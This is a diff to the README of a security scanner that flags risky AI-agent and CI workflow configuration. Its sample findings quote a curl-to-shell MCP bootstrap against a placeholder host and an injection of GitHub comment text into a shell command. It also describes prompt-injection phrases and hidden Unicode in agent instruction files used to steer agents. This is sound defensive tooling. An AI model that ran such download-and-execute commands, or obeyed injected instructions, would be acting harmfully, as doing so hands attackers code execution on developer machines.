@@ -24,6 +24,7 @@ Read the deeper context:
 - [Threat model](docs/threat-model.md)
 - [Reporting guide](docs/reporting.md)
 - [Adoption guide](docs/adoption.md)
+- [Releasing guide](docs/releasing.md)
 
 ## Quick Start
 
@@ -98,13 +99,19 @@ agentic-risk-scan init-ci --report-artifact
 - Secret and OIDC exposure in untrusted-trigger workflows.
 - Self-hosted runner use from untrusted triggers.
 - Prompt-injection phrases and hidden Unicode in `AGENTS.md`, `CLAUDE.md`,
-  `.github/copilot-instructions.md`, `.cursor/rules/*`, and similar files.
+  `.github/copilot-instructions.md`, `.cursor/rules/*`, agent-skill
+  instructions (`.claude/skills/**/SKILL.md`, `skills/**/SKILL.md`), and
+  similar files.
 - Risky committed agent client settings in `.claude/settings.json`,
   `.codex/config.toml`, and `.gemini/settings.json`, including broad tool
   grants, disabled approvals, full-access permission profiles, literal
   secret-like values, and secret-redaction bypasses.
 - MCP servers launched through shell wrappers, runtime downloads, unpinned `npx`,
-  broad runtime flags, temporary paths, or inline secret-like values.
+  broad runtime flags, temporary paths, inline secret-like values, or
+  code-injecting environment variables (`NODE_OPTIONS`, `LD_PRELOAD`, `PYTHONPATH`).
+- Remote (HTTP/SSE) MCP servers reached over plaintext HTTP, pointed at
+  link-local or cloud metadata addresses, or configured with committed secret
+  headers.
 - npm install lifecycle scripts with `curl | sh`, `eval`, inline interpreters,
   secret-printing, or remote tarball dependencies.
 
@@ -114,11 +121,11 @@ agentic-risk-scan init-ci --report-artifact
 PYTHONPATH=src python3 -m agentic_risk_scan scan examples/unsafe-ai-pr-bot --fail-on none
 ```
 
-Sample output:
+Real output (reproduce with the command above):
 
 ```text
 Agentic Risk Scan
-root: /path/to/examples/unsafe-ai-pr-bot
+root: examples/unsafe-ai-pr-bot
 risk score: 100/100
 findings: critical=1, high=11, medium=3, low=1
 scanned files: 4, skipped files: 0
@@ -126,7 +133,63 @@ scanned files: 4, skipped files: 0
 [CRITICAL] GHA001 pull_request_target checks out untrusted PR code
   at: .github/workflows/unsafe.yml:16
   why: This workflow runs with target-repository privileges and checks out code from the pull request head.
+  evidence: - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+  fix: Use pull_request with read-only permissions, or split analysis and write-back into separate workflows connected by reviewed artifacts.
+
+[HIGH] GHA003 Untrusted GitHub event data is interpolated into shell
+  at: .github/workflows/unsafe.yml:22
+  why: PR, issue, comment, discussion, or workflow input text is used inside a shell command. Attackers can inject shell syntax through GitHub content.
+  evidence: echo "${{ github.event.comment.body }}" > prompt.txt ...
+  fix: Pass event payload through files or environment variables, quote safely, or process it in a language runtime without shell interpolation.
+
+[HIGH] MCP002 MCP server uses download-and-execute bootstrap
+  at: .mcp.json:3
+  why: MCP server 'bootstrap' downloads code and pipes it into an interpreter.
+  evidence: bash -c curl https://example.invalid/mcp.sh | sh
+  fix: Install MCP servers from pinned packages or checked-in scripts instead of runtime fetches.
 ```
+
+Every finding names the input boundary, the risky privilege, the evidence line,
+and the fix. The safe example scores `0/100`:
+
+```bash
+PYTHONPATH=src python3 -m agentic_risk_scan scan examples/safe-agent-workflow --fail-on high
+```
+
+## Why This vs a Generic SAST Tool
+
+Traditional SAST looks for vulnerable application code: injection sinks, unsafe
+deserialization, weak crypto. `agentic-risk-scan` looks at a different layer —
+the repository configuration that decides how much damage an AI agent or
+untrusted contributor input can do before any application code runs. These are
+threats that a code-focused scanner does not model.
+
+- **PR / comment injection into privileged workflows.** A `pull_request_target`
+  workflow that checks out fork code, or a step that interpolates
+  `github.event.*` text into a shell, hands untrusted input a write-capable
+  token. This scanner flags the boundary directly (`GHA001`, `GHA003`), instead
+  of treating the workflow as inert YAML.
+- **MCP download-and-execute bootstrap.** An MCP server whose command pipes a
+  remote script into an interpreter (`curl … | sh`) runs attacker-controlled
+  code on a developer workstation at agent-startup time. `MCP002` catches this
+  supply-chain pattern that lives in `.mcp.json`, not in any source file a SAST
+  tool parses.
+- **Hidden-Unicode and prompt-injection instructions.** Bidirectional control
+  characters (`AGENT001`), zero-width characters (`AGENT002`), and
+  prompt-injection phrases (`AGENT003`) inside `AGENTS.md`, `CLAUDE.md`, or
+  `.cursor/rules/*` steer an agent's behavior while looking benign in review.
+  Generic linters treat these files as prose and skip them entirely.
+- **Over-privileged agent client config.** Disabled sandboxes (`CFG006`,
+  `CFG007`), disabled approvals (`CFG008`), full-access permission profiles
+  (`CFG011`), and inline secret-like values (`CFG012`) in committed
+  `.claude` / `.codex` / `.gemini` settings widen the blast radius before the
+  agent does anything. This is configuration risk, not code risk.
+
+The scope is intentionally the agentic attack surface, not general application
+security. Run both: a SAST tool for your application code, and this for the
+agent and workflow configuration that a SAST tool does not read. See
+[docs/threat-model.md](docs/threat-model.md) for the full asset and
+untrusted-input model.
 
 ## GitHub Actions
 
@@ -147,13 +210,15 @@ on:
 
 permissions:
   contents: read
-  security-events: write
 
 jobs:
   scan:
+    permissions:
+      contents: read
+      security-events: write
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
       - uses: actions/setup-python@v5
         with:
           python-version: "3.12"
@@ -168,7 +233,7 @@ jobs:
 Or use this repository as a composite action:
 
 ```yaml
-- uses: actions/checkout@v4
+- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
   with:
     fetch-depth: 0
 - uses: ecoreal/agentic-risk-scan@v0
@@ -343,7 +408,9 @@ See [docs/reporting.md](docs/reporting.md) for CI artifact examples.
 
 - More agent ecosystem config coverage.
 - Taint tracking for workflow artifacts and generated patches.
-- npm, PyPI, Homebrew, and container releases.
+- PyPI release (automated publish workflow is in place; see
+  [docs/releasing.md](docs/releasing.md) for the trusted-publishing setup).
+- npm, Homebrew, and container releases.
 
 ## Contributing
 
